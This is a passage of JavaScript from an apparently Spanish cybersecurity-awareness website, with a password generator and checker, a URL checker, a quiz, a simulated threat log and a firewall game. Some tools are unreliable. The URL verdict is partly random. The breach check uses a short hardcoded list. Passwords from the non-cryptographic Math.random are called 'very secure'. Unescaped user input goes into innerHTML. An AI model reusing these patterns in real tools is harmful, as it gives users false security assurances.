
// --- ANIMACIONES DE SCROLL Y EFECTOS VISUALES ---
function initScrollAnimations() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animate-in');
            }
        });
    }, observerOptions);

    // Observar todas las secciones con clase reveal
    document.querySelectorAll('.reveal').forEach(section => {
        observer.observe(section);
    });
}

// --- EFECTOS DE PARTÍCULAS ---
function initParticles() {
    const canvas = document.createElement('canvas');
    canvas.id = 'particles-canvas';
    canvas.style.position = 'fixed';
    canvas.style.top = '0';
    canvas.style.left = '0';
    canvas.style.width = '100%';
    canvas.style.height = '100%';
    canvas.style.pointerEvents = 'none';
    canvas.style.zIndex = '-1';
    document.body.appendChild(canvas);

    const ctx = canvas.getContext('2d');
    let particles = [];

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }

    function createParticle() {
        return {
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            vx: (Math.random() - 0.5) * 0.5,
            vy: (Math.random() - 0.5) * 0.5,
            size: Math.random() * 2 + 1,
            opacity: Math.random() * 0.5 + 0.2
        };
    }

    function updateParticles() {
        particles.forEach(p => {
            p.x += p.vx;
            p.y += p.vy;

            if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
            if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
        });
    }

    function drawParticles() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        particles.forEach(p => {
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(0, 123, 255, ${p.opacity})`;
            ctx.fill();
        });
    }

    function animate() {
        updateParticles();
        drawParticles();
        requestAnimationFrame(animate);
    }

    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    // Crear partículas iniciales
    for (let i = 0; i < 50; i++) {
        particles.push(createParticle());
    }

    animate();
}

// --- SONIDOS AMBIENTALES ---
let ambientAudio = null;
let isAmbientPlaying = false;

function initAmbientSounds() {
    // Crear audio de fondo (tonos suaves de "conexión digital")
    ambientAudio = new (window.AudioContext || window.webkitAudioContext)();
    
    function playAmbientTone() {
        if (!isAmbientPlaying) return;
        
        const oscillator = ambientAudio.createOscillator();
        const gainNode = ambientAudio.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(ambientAudio.destination);
        
        oscillator.frequency.setValueAtTime(220, ambientAudio.currentTime); // Nota A3
        oscillator.type = 'sine';
        
        gainNode.gain.setValueAtTime(0.05, ambientAudio.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, ambientAudio.currentTime + 2);
        
        oscillator.start(ambientAudio.currentTime);
        oscillator.stop(ambientAudio.currentTime + 2);
        
        // Repetir cada 5-10 segundos
        setTimeout(playAmbientTone, Math.random() * 5000 + 5000);
    }
    
    // Control de volumen
    window.toggleAmbientSound = function() {
        isAmbientPlaying = !isAmbientPlaying;
        if (isAmbientPlaying) {
            playAmbientTone();
        }
    };
}

// --- SISTEMA DE NOTIFICACIONES ---
function showNotification(message, type = 'info', duration = 5000) {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-triangle' : 'info-circle'}"></i>
        ${message}
        <button onclick="this.parentElement.remove()" class="notification-close">&times;</button>
    `;
    
    document.body.appendChild(notification);
    
    // Animación de entrada
    setTimeout(() => notification.classList.add('show'), 100);
    
    // Auto-remover
    setTimeout(() => {
        if (notification.parentElement) {
            notification.classList.remove('show');
            setTimeout(() => notification.remove(), 300);
        }
    }, duration);
}

// --- DASHBOARD DE PROGRESO GLOBAL ---
function showGlobalProgress() {
    const phishingStats = JSON.parse(localStorage.getItem('phishingStats')) || { gamesPlayed: 0, bestScore: 0 };
    const firewallStats = JSON.parse(localStorage.getItem('firewallStats')) || { gamesPlayed: 0, bestScore: 0 };
    const userPoints = parseInt(localStorage.getItem('userPoints')) || 0;
    const badges = JSON.parse(localStorage.getItem('badges')) || [];
    
    const totalGames = phishingStats.gamesPlayed + firewallStats.gamesPlayed;
    const bestTotalScore = phishingStats.bestScore + firewallStats.bestScore;
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 600px;">
            <div class="modal-header">
                <h3><i class="fas fa-trophy"></i> Tu Progreso Global</h3>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 20px; margin-bottom: 30px;">
                    <div class="progress-card">
                        <div style="font-size: 2rem; color: var(--accent);">${userPoints}</div>
                        <div>Puntos Totales</div>
                    </div>
                    <div class="progress-card">
                        <div style="font-size: 2rem; color: var(--success);">${totalGames}</div>
                        <div>Juegos Jugados</div>
                    </div>
                    <div class="progress-card">
                        <div style="font-size: 2rem; color: var(--warning);">${bestTotalScore}</div>
                        <div>Mejor Puntuación</div>
                    </div>
                    <div class="progress-card">
                        <div style="font-size: 2rem; color: var(--danger);">${badges.length}</div>
                        <div>Insignias</div>
                    </div>
                </div>
                
                <h4>Insignias Desbloqueadas:</h4>
                <div id="badges-container" style="display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px;">
                    ${badges.map(badge => `<span class="badge-item">${badge}</span>`).join('')}
                </div>
                
                <div style="margin-top: 30px;">
                    <h4>Estadísticas por Juego:</h4>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 15px;">
                        <div>
                            <h5>Phishing Detector</h5>
                            <p>Juegos: ${phishingStats.gamesPlayed}</p>
                            <p>Mejor: ${phishingStats.bestScore}</p>
                        </div>
                        <div>
                            <h5>Firewall Defender</h5>
                            <p>Juegos: ${firewallStats.gamesPlayed}</p>
                            <p>Mejor: ${firewallStats.bestScore}</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
}

// --- TEMAS PERSONALIZABLES ---
const themes = {
    default: {
        '--bg-deep': '#0a0a0a',
        '--bg-card': 'rgba(255, 255, 255, 0.05)',
        '--text-p': '#ffffff',
        '--text-s': '#b0b0b0',
        '--accent': '#00d4ff',
        '--success': '#00ff88',
        '--warning': '#ffaa00',
        '--danger': '#ff4444'
    },
    cyberpunk: {
        '--bg-deep': '#0d001a',
        '--bg-card': 'rgba(255, 0, 255, 0.05)',
        '--text-p': '#ffffff',
        '--text-s': '#ff00ff',
        '--accent': '#ff00ff',
        '--success': '#00ffff',
        '--warning': '#ffff00',
        '--danger': '#ff0000'
    },
    minimal: {
        '--bg-deep': '#ffffff',
        '--bg-card': 'rgba(0, 0, 0, 0.05)',
        '--text-p': '#000000',
        '--text-s': '#666666',
        '--accent': '#000000',
        '--success': '#008000',
        '--warning': '#ffa500',
        '--danger': '#ff0000'
    }
};

function changeTheme(themeName) {
    const theme = themes[themeName];
    if (theme) {
        Object.keys(theme).forEach(prop => {
            document.documentElement.style.setProperty(prop, theme[prop]);
        });
        localStorage.setItem('selectedTheme', themeName);
    }
}

// --- MODO ACCESIBILIDAD ---
function toggleAccessibilityMode() {
    document.body.classList.toggle('accessibility-mode');
    localStorage.setItem('accessibilityMode', document.body.classList.contains('accessibility-mode'));
}

function showThemeSelector() {
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 400px;">
            <div class="modal-header">
                <h3><i class="fas fa-palette"></i> Seleccionar Tema</h3>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                    <button onclick="changeTheme('default')" class="theme-option" style="background: linear-gradient(135deg, #0a0a0a, #1a1a1a); color: white; padding: 20px; border-radius: 8px; border: none; cursor: pointer;">
                        <i class="fas fa-moon"></i><br>Default
                    </button>
                    <button onclick="changeTheme('cyberpunk')" class="theme-option" style="background: linear-gradient(135deg, #0d001a, #1a0033); color: #ff00ff; padding: 20px; border-radius: 8px; border: none; cursor: pointer;">
                        <i class="fas fa-robot"></i><br>Cyberpunk
                    </button>
                    <button onclick="changeTheme('minimal')" class="theme-option" style="background: linear-gradient(135deg, #ffffff, #f0f0f0); color: black; padding: 20px; border-radius: 8px; border: 1px solid #ccc; cursor: pointer;">
                        <i class="fas fa-circle"></i><br>Minimal
                    </button>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
}

// --- HERRAMIENTAS INTERACTIVAS ---
function generarPasswordSegura(largo = 16) {
    const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+';
    let password = '';
    for (let i = 0; i < largo; i++) {
        password += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }

    // 1. Mostrar la contraseña de forma visible en el campo del generador
    const genInput = document.getElementById("generated-pass-input");
    if (genInput) genInput.value = password;

    // 2. Validar automáticamente en el analizador técnico si existe
    const inputChecker = document.getElementById("pass-checker");
    if (inputChecker) {
        inputChecker.value = password;
        inputChecker.dispatchEvent(new Event('input'));
    }
    
    // Mostrar en modal
    const modal = document.createElement('div'); // Crear el modal
    modal.id = 'generated-password-modal'; // Asignar un ID único al modal
    modal.className = 'modal-overlay show-modal'; // Clases para mostrarlo
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 400px;">
            <div class="modal-header">
                <h3><i class="fas fa-key"></i> Contraseña Generada</h3>
                <button class="close-modal" onclick="closeModal('generated-password-modal')"><i class="fas fa-times"></i></button>
            </div>
            <div class="modal-body">
                <div style="background: var(--bg-card); padding: 15px; border-radius: 8px; font-family: monospace; font-size: 1.2rem; word-break: break-all; margin: 15px 0;">
                    ${password}
                </div>
                <p style="color: var(--success); font-weight: bold;">¡Esta contraseña es muy segura!</p>
                <p style="font-size: 0.9rem; color: var(--text-s);">Cópiala y guárdala en un gestor de contraseñas. No la uses en múltiples sitios.</p>
            </div>
            <div class="modal-footer">
                <button onclick="navigator.clipboard.writeText('${password}'); showNotification('Contraseña copiada al portapapeles', 'success');" class="btn-primary">Copiar</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    ganarPuntos(5, 'Generar contraseña segura');
}

function verificarURL() {
    const url = document.getElementById('url-checker').value;
    if (!url) {
        showNotification('Por favor ingresa una URL', 'error');
        return;
    }
    // Simulación de verificación (en producción usar API real)
    const esSospechosa = url.includes('bit.ly') || url.includes('tinyurl') || url.includes('suspicious') || Math.random() > 0.7;
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 400px;">
            <div class="modal-header">
                <h3><i class="fas fa-search"></i> Resultado del Análisis</h3>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div style="text-align: center; margin: 20px 0;">
                    <i class="fas fa-${esSospechosa ? 'exclamation-triangle' : 'check-circle'}" style="font-size: 3rem; color: var(--${esSospechosa ? 'danger' : 'success'});"></i>
                </div>
                <h4 style="color: var(--${esSospechosa ? 'danger' : 'success'}); text-align: center;">
                    ${esSospechosa ? '¡URL Sospechosa Detectada!' : 'URL Parece Segura'}
                </h4>
                <p style="font-size: 0.9rem; margin: 15px 0;">
                    ${esSospechosa ? 
                        'Esta URL podría ser peligrosa. Contiene acortadores o dominios sospechosos. No hagas clic si no confías en la fuente.' : 
                        'No se detectaron indicadores obvios de peligro, pero siempre verifica la fuente antes de hacer clic.'}
                </p>
                <div style="background: var(--bg-card); padding: 10px; border-radius: 4px; font-family: monospace; font-size: 0.8rem; word-break: break-all;">
                    ${url}
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    if (!esSospechosa) {
        ganarPuntos(3, 'Verificar URL segura');
    }
}

function calcularFuerzaPassword() {
    const password = document.getElementById('password-strength').value;
    if (!password) {
        showNotification('Por favor ingresa una contraseña', 'error');
        return;
    }
    
    // Cálculo simplificado de tiempo de cracking
    let score = 0;
    let timeToCrack = 'instantáneo';
    
    if (password.length >= 8) score += 1;
    if (password.length >= 12) score += 1;
    if (/[A-Z]/.test(password)) score += 1;
    if (/[a-z]/.test(password)) score += 1;
    if (/[0-9]/.test(password)) score += 1;
    if (/[^A-Za-z0-9]/.test(password)) score += 1;
    
    if (score <= 2) timeToCrack = 'segundos';
    else if (score <= 4) timeToCrack = 'minutos a horas';
    else if (score <= 5) timeToCrack = 'días a semanas';
    else timeToCrack = 'años o más';
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 400px;">
            <div class="modal-header">
                <h3><i class="fas fa-chart-bar"></i> Análisis de Fuerza</h3>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div style="text-align: center; margin: 20px 0;">
                    <div style="font-size: 3rem; color: var(--${score >= 5 ? 'success' : score >= 3 ? 'warning' : 'danger'});">
                        ${score}/6
                    </div>
                    <div style="color: var(--text-s);">Puntuación de Seguridad</div>
                </div>
                <div style="background: var(--bg-card); padding: 15px; border-radius: 8px; margin: 15px 0;">
                    <strong>Tiempo estimado para crackear:</strong> ${timeToCrack}
                </div>
                <div style="font-size: 0.9rem; color: var(--text-s);">
                    ${score >= 5 ? 
                        '¡Excelente! Tu contraseña es muy fuerte.' : 
                        score >= 3 ? 
                        'Buena contraseña, pero considera agregarle más caracteres especiales.' : 
                        'Esta contraseña es vulnerable. Úsala solo para cuentas no importantes.'}
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    if (score >= 5) {
        ganarPuntos(5, 'Analizar contraseña fuerte');
    }
}
const terminalData = {
    elementId: "content-area", // Se inyectará en la sección de Protocolos
    texto: [
        "> Bienvenido al Asistente de Configuración.",
        "> Analizando opciones de privacidad de tu dispositivo...",
        "> Identificando áreas de mejora en tus contraseñas...",
        "> [LISTO] - Sigue nuestras guías para optimizar tu seguridad."
    ],
    velocidad: 50
};

let lineaActual = 0;
let charIndex = 0;

function escribirTerminal() {
    const area = document.getElementById(terminalData.elementId);
    if (!area) return; // Previene error si no existe el elemento
    
    if (lineaActual < terminalData.texto.length) {
        if (charIndex === 0) {
            const p = document.createElement("p");
            p.style.fontFamily = "'JetBrains Mono', monospace";
            p.style.color = "var(--accent)";
            p.style.fontSize = "0.9rem";
            p.id = `linea-${lineaActual}`;
            area.appendChild(p);
        }

        const parrafo = document.getElementById(`linea-${lineaActual}`);
        parrafo.textContent += terminalData.texto[lineaActual].charAt(charIndex);
        charIndex++;

        if (charIndex < terminalData.texto[lineaActual].length) {
            setTimeout(escribirTerminal, terminalData.velocidad);
        } else {
            lineaActual++;
            charIndex = 0;
            setTimeout(escribirTerminal, 500); // Pausa entre líneas
        }
    }
}

// --- 2. VERIFICADOR DE CONTRASEÑAS TÉCNICO ---
// Vamos a inyectar el verificador dentro del área de protocolos después de la terminal
function cargarVerificador() {
    const area = document.getElementById(terminalData.elementId);
    if (!area) return; // Previene error si no existe el elemento
    
    const container = document.createElement("div");
    container.className = "card";
    container.style.marginTop = "2rem";
    container.innerHTML = `
        <span class="card-tag">Herramienta</span>
        <h3>Analizador de Contraseñas</h3>
        <p>Averigua qué tan segura es tu clave actual.</p>
        <div style="display:flex; gap:10px; margin-top:10px;">
            <input type="password" id="pass-checker" placeholder="Escribe aquí para probar..." 
                   style="flex-grow:1; padding:12px; background:rgba(0,0,0,0.2); border:1px solid var(--border-glass); color:white; border-radius:8px;">
            <button onclick="generarPasswordSegura()" class="btn-secondary" style="padding: 12px 20px; margin:0;" title="Generar Contraseña Segura"><i class="fas fa-random"></i></button>
        </div>
        <div id="meter" style="height:4px; width:0%; transition:0.5s; margin-top:10px; border-radius:2px;"></div>
        <p id="pass-msg" style="font-size:0.85rem; margin-top:8px; color:var(--text-s);">Esperando entrada...</p>
    `;
    area.appendChild(container);

    const input = document.getElementById("pass-checker");
    const meter = document.getElementById("meter");
    const msg = document.getElementById("pass-msg");

    input.addEventListener("input", async () => {
        const val = input.value;
        let score = 0;

        if (val.length >= 8) score++;
        if (/[0-9]/.test(val)) score++;
        if (/[A-Z]/.test(val)) score++;
        if (/[!@#$%^&*]/.test(val)) score++;

        // Simular consulta a Have I Been Pwned
        let breached = false;
        if (val.length > 0) {
            breached = await checkPasswordBreach(val);
        }

        if (val.length === 0) {
            meter.style.width = "0%";
            msg.innerText = "Esperando entrada...";
        } else if (breached) {
            meter.style.width = "20%";
            meter.style.backgroundColor = "var(--danger)"; 
            msg.innerText = "¡PELIGRO! Esta contraseña ha sido filtrada en brechas de datos. Cámbiala inmediatamente.";
        } else if (score < 2) {
            meter.style.width = "30%";
            meter.style.backgroundColor = "var(--danger)"; 
            msg.innerText = "Débil: Intenta que sea más larga y usa algún símbolo.";
        } else if (score < 4) {
            meter.style.width = "60%";
            meter.style.backgroundColor = "var(--warning)"; 
            msg.innerText = "Regular: ¡Vas bien! Agrega un número o mayúscula extra.";
        } else {
            meter.style.width = "100%";
            meter.style.backgroundColor = "var(--success)";
            msg.innerText = "Fuerte: ¡Excelente! Esta es una contraseña muy segura.";
        }
    });
}

// --- 3. QUIZ DE EVALUACIÓN ---
const preguntas = [
    { q: "¿Cuál es el vector principal del 91% de ataques?", a: "Fuerza bruta", b: "Phishing", c: "Virus USB", correct: "b" },
    { q: "¿Qué significa Zero Trust?", a: "Confianza total", b: "No confiar en nadie", c: "Sin antivirus", correct: "b" },
    { q: "¿Cuál es la contraseña más segura?", a: "123456", b: "Password123!", c: "Una frase larga con símbolos", correct: "c" },
    { q: "¿Qué es un firewall?", a: "Un antivirus", b: "Un muro de protección de red", c: "Un gestor de contraseñas", correct: "b" },
    { q: "¿Cómo se llama el ataque que cifra tus archivos?", a: "Phishing", b: "Ransomware", c: "Spyware", correct: "b" },
    { q: "¿Qué debes hacer con correos sospechosos?", a: "Abrirlos inmediatamente", b: "No abrir ni hacer clic en enlaces", c: "Responder al remitente", correct: "b" },
    { q: "¿Qué es 2FA?", a: "Dos firewalls activos", b: "Autenticación de dos factores", c: "Dos antivirus", correct: "b" },
    { q: "¿Cuál es un riesgo de Wi-Fi público?", a: "Es más rápido", b: "Puede ser interceptado", c: "Es gratis", correct: "b" },
    { q: "¿Qué protege contra malware?", a: "Un gestor de contraseñas", b: "Antivirus actualizado", c: "Cambiar el navegador", correct: "b" },
    { q: "¿Qué es una brecha de datos?", a: "Un agujero en la pared", b: "Filtración de información personal", c: "Un error de ortografía", correct: "b" }
];

let currentQ = 0;
let scoreQuiz = 0;

function iniciarQuiz() {
    currentQ = 0;
    scoreQuiz = 0;
    document.getElementById('cert-container').style.display = 'none';
    document.getElementById('diploma-area').style.display = 'none';
    
    const quizBox = document.querySelector(".quiz-box");
    quizBox.innerHTML = `<h3>Evaluación en curso...</h3><div id="q-area"></div>`;
    mostrarPregunta();
}

function mostrarPregunta() {
    const area = document.getElementById("q-area");
    if (currentQ < preguntas.length) {
        const p = preguntas[currentQ];
        area.innerHTML = `
            <p style="margin-bottom:1.5rem;">${p.q}</p>
            <div style="display:grid; gap:10px;">
                <button class="btn-secondary" onclick="checkQuiz('a')">${p.a}</button>
                <button class="btn-secondary" onclick="checkQuiz('b')">${p.b}</button>
                <button class="btn-secondary" onclick="checkQuiz('c')">${p.c}</button>
            </div>
        `;
    } else {
        area.innerHTML = `<h4>Evaluación Finalizada</h4><p>Puntaje: ${scoreQuiz}/${preguntas.length}</p>`;
        if (scoreQuiz === preguntas.length) {
            document.getElementById('cert-container').style.display = 'block';
        } else {
            area.innerHTML += `<p style="color:var(--warning); margin-top:10px;">Debes acertar todas para obtener tu certificado. ¡Vuelve a intentarlo!</p>`;
        }
    }
}

function checkQuiz(ans) {
    if (ans === preguntas[currentQ].correct) {
        alert(" Respuesta correcta.");
        scoreQuiz++;
        ganarPuntos(10, 'Respuesta correcta en el quiz');
    } else {
        alert(" Error. Revisa el glosario y las guías.");
    }
    currentQ++;
    mostrarPregunta();
}

function generarCertificado() {
    const nombre = document.getElementById('cert-name').value.trim();
    if (!nombre) {
        alert("Por favor, ingresa tu nombre.");
        return;
    }
    document.getElementById('cert-container').style.display = 'none';
    const diploma = document.getElementById('diploma-area');
    diploma.style.display = 'block';
    diploma.innerHTML = `
        <div class="diploma-card reveal active">
            <h2 style="color: var(--accent); margin-bottom: 10px;">CERTIFICADO DE CIBERSEGURIDAD</h2>
            <p>Se otorga la presente insignia a:</p>
            <h3 style="font-size: 1.8rem; margin: 15px 0; color: white;">${nombre}</h3>
            <p style="font-size: 0.9rem; color: var(--text-s);">Por completar exitosamente el entrenamiento de Binary Three y demostrar excelentes conocimientos preventivos.</p>
            <div style="margin-top: 20px; color: var(--success);"><i class="fas fa-check-circle fa-2x"></i></div>
        </div>
    `;
}

// --- 4. INICIALIZADOR GLOBAL Y CHECKLIST ---
window.onload = () => {
    // Iniciamos la terminal al cargar
    escribirTerminal();
    
    // Cargamos el verificador de claves después de un breve delay
    setTimeout(cargarVerificador, 2000);
    
    // Intersection Observer para animaciones de scroll (.reveal)
    const reveals = document.querySelectorAll('.reveal');
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if(entry.isIntersecting) {
                entry.target.classList.add('active');
            }
        });
    }, { threshold: 0.1 });
    
    reveals.forEach(reveal => {
        observer.observe(reveal);
    });

    // Cargar Checklist de LocalStorage
    document.querySelectorAll('.checklist-item').forEach(item => {
        if (item.id) {
            const isChecked = localStorage.getItem('binary_three_' + item.id) === 'true';
            if (isChecked) {
                item.classList.add('checked');
            }
        }
    });
    actualizarProgreso();

    // Animación de Contadores
    const counters = document.querySelectorAll('.counter');
    const counterObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if(entry.isIntersecting) {
                const target = +entry.target.getAttribute('data-target');
                let count = 0;
                const updateCount = () => {
                    const inc = target / 40;
                    if(count < target) {
                        count += inc;
                        entry.target.innerText = Math.ceil(count);
                        setTimeout(updateCount, 30);
                    } else {
                        entry.target.innerText = target;
                    }
                };
                updateCount();
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    counters.forEach(counter => counterObserver.observe(counter));

    // Scrollspy e Indicador de Volver Arriba
    const sections = document.querySelectorAll('section');
    const navLinks = document.querySelectorAll('.nav-links a.nav-link');
    const btnTop = document.getElementById('btn-top');
    
    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach(section => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (scrollY >= (sectionTop - sectionHeight / 3)) {
                current = section.getAttribute('id');
            }
        });

        navLinks.forEach(link => {
            link.classList.remove('active-link');
            if (link.getAttribute('href').includes(current) && current !== '') {
                link.classList.add('active-link');
            }
        });
        
        if (window.scrollY > 300) {
            btnTop.classList.add('show');
        } else {
            btnTop.classList.remove('show');
        }
    });
};

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Menú Responsivo
function toggleMenu() {
    const navLinks = document.querySelector('.nav-links');
    navLinks.classList.toggle('active');
}

function toggleCheck(element) {
    element.classList.toggle('checked');
    if (element.id) {
        localStorage.setItem('binary_three_' + element.id, element.classList.contains('checked'));
        if (element.classList.contains('checked')) {
            ganarPuntos(5, 'Completaste un ítem del checklist');
        }
    }
    actualizarProgreso();
}

// Accesibilidad para el Checklist
function handleCheckKeyPress(event, element) {
    if (event.key === 'Enter' || event.key === ' ') {
        event.preventDefault();
        toggleCheck(element);
    }
}

function actualizarProgreso() {
    const total = document.querySelectorAll('.checklist-item').length;
    const checked = document.querySelectorAll('.checklist-item.checked').length;
    const porcentaje = Math.round((checked / total) * 100);
    
    document.getElementById('security-progress').style.width = porcentaje + '%';
    document.getElementById('progress-text').innerText = porcentaje + '% Completado';
    
    if (porcentaje === 100) {
        document.getElementById('progress-text').innerText = '¡Felicidades! Tienes excelentes hábitos digitales.';
        document.getElementById('progress-text').style.color = 'var(--success)';
    } else {
        document.getElementById('progress-text').style.color = 'var(--text-s)';
    }
}
// Agrega esto a tus funciones de Verificador y Quiz
const logs = [];

function registrarEvento(evento, severidad) {
    const timestamp = new Date().toLocaleTimeString();
    const nuevoLog = `[${timestamp}] [${severidad}] ${evento}`;
    logs.unshift(nuevoLog); // Añade al inicio del array
    actualizarVistaLogs();
}

function actualizarVistaLogs() {
    const logArea = document.getElementById("log-viewer");
    if(logArea) {
        logArea.innerHTML = logs.map(log => {
            let colorClass = "log-info";
            if (log.includes("[HIGH]")) colorClass = "log-high";
            else if (log.includes("[LOW]") || log.includes("[WARNING]")) colorClass = "log-warning";
            else if (log.includes("[SUCCESS]")) colorClass = "log-success";
            return `<p class="${colorClass}">> ${log}</p>`;
        }).join("");
    }
}

// Simular consulta a Have I Been Pwned
async function checkPasswordBreach(password) {
    // En producción, usar API real con hash SHA-1
    // Aquí simulamos con contraseñas comunes filtradas
    const commonBreached = ["123456", "password", "123456789", "qwerty", "abc123", "password123"];
    return commonBreached.includes(password.toLowerCase());
}

function simuladorAmenazas() {
    const amenazas = ["Fuerza Bruta en Puerto 22", "Inyección SQL detectada", "Intento de login: Admin", "Escaneo de puertos bloqueado", "Acceso denegado a /etc/shadow"];
    setInterval(() => {
        const index = Math.floor(Math.random() * amenazas.length);
        const isHigh = Math.random() > 0.5;
        registrarEvento(`AMENAZA: ${amenazas[index]}`, isHigh ? "HIGH" : "WARNING");
    }, 8000); // Cada 8 segundos
}

// --- 5. FIREWALL DEFENDER GAME ---
let gameScore = 0;
let gameInterval;
let firewallLevel = 1;
let firewallRound = 1;
let firewallStats = JSON.parse(localStorage.getItem('firewallStats')) || { gamesPlayed: 0, totalScore: 0, bestScore: 0, accuracy: 0 };
let firewallTutorialShown = localStorage.getItem('firewallTutorialShown') === 'true';
let keyboardMode = false; // Modo teclado activado/desactivado

const tiposPaquetes = [
    { tipo: 'phishing', color: 'var(--danger)', icono: 'fas fa-envelope-open-text', texto: 'PHISHING', esAmenaza: true, explicacion: 'Correo fraudulento que intenta robar datos.' },
    { tipo: 'malware', color: 'var(--danger)', icono: 'fas fa-virus', texto: 'MALWARE', esAmenaza: true, explicacion: 'Software malicioso que daña el sistema.' },
    { tipo: 'spam', color: 'var(--danger)', icono: 'fas fa-exclamation-triangle', texto: 'SPAM', esAmenaza: true, explicacion: 'Correo no deseado que puede contener amenazas.' },
    { tipo: 'correo-ok', color: 'var(--success)', icono: 'fas fa-envelope', texto: 'CORREO OK', esAmenaza: false, explicacion: 'Correo legítimo y seguro.' },
    { tipo: 'actualizacion', color: 'var(--success)', icono: 'fas fa-download', texto: 'ACTUALIZACIÓN', esAmenaza: false, explicacion: 'Actualización de software segura.' }
];

// --- SISTEMA DE PUNTOS Y GAMIFICACIÓN ---
let userPoints = 0;
let badges = [];

function ganarPuntos(puntos, razon) {
    userPoints += puntos;
    document.getElementById('user-points').innerText = userPoints;
    localStorage.setItem('binary_three_points', userPoints);
    registrarEvento(`+${puntos} puntos: ${razon}`, "SUCCESS");
    checkBadges();
}

function checkBadges() {
    if (userPoints >= 50 && !badges.includes('Principiante')) {
        badges.push('Principiante');
        mostrarBadge('Principiante', '¡Has completado tus primeros pasos en ciberseguridad!');
    }
    if (userPoints >= 100 && !badges.includes('Intermedio')) {
        badges.push('Intermedio');
        mostrarBadge('Intermedio', '¡Eres un guardián digital!');
    }
    if (userPoints >= 200 && !badges.includes('Experto')) {
        badges.push('Experto');
        mostrarBadge('Experto', '¡Maestro de la ciberseguridad!');
    }
    localStorage.setItem('binary_three_badges', JSON.stringify(badges));
}

function mostrarBadge(titulo, descripcion) {
    const badgeDiv = document.createElement('div');
    badgeDiv.className = 'badge-notification';
    badgeDiv.innerHTML = `
        <div class="badge-content">
            <i class="fas fa-medal"></i>
            <h4>${titulo}</h4>
            <p>${descripcion}</p>
        </div>
    `;
    document.body.appendChild(badgeDiv);
    setTimeout(() => badgeDiv.remove(), 5000);
}

function iniciarFirewall() {
    // Mostrar tutorial si no se ha mostrado
    if (!firewallTutorialShown) {
        mostrarTutorialFirewall();
        return;
    }

    const container = document.getElementById("game-container");
    const scoreDisplay = document.getElementById("game-score");
    const resultDiv = document.getElementById('game-result');
    const timerDiv = document.getElementById('game-timer');
    const timerBar = document.getElementById('timer-bar');
    const timerText = document.getElementById('timer-text');
    
    // Reiniciar estado
    container.innerHTML = "";
    gameScore = 0;
    firewallLevel = 1;
    firewallRound = 1;
    scoreDisplay.innerText = "Score: 0 | Nivel: 1 | Ronda: 1";
    resultDiv.style.display = 'none';
    timerDiv.style.display = 'block';
    timerBar.style.width = '100%';
    timerText.innerText = '20s';
    registrarEvento("Iniciando práctica de firewall...", "INFO");

    if (gameInterval) clearInterval(gameInterval);

    // Dificultad progresiva: intervalos más cortos en niveles altos
    let intervalo = 1000 - (firewallLevel - 1) * 100;
    intervalo = Math.max(intervalo, 300); // Mínimo 300ms

    gameInterval = setInterval(() => {
        crearPaquete(container);
        firewallRound++;
        if (firewallRound % 10 === 0) { // Cada 10 paquetes, subir nivel
            firewallLevel++;
            intervalo = Math.max(intervalo - 100, 300);
            clearInterval(gameInterval);
            gameInterval = setInterval(() => crearPaquete(container), intervalo);
        }
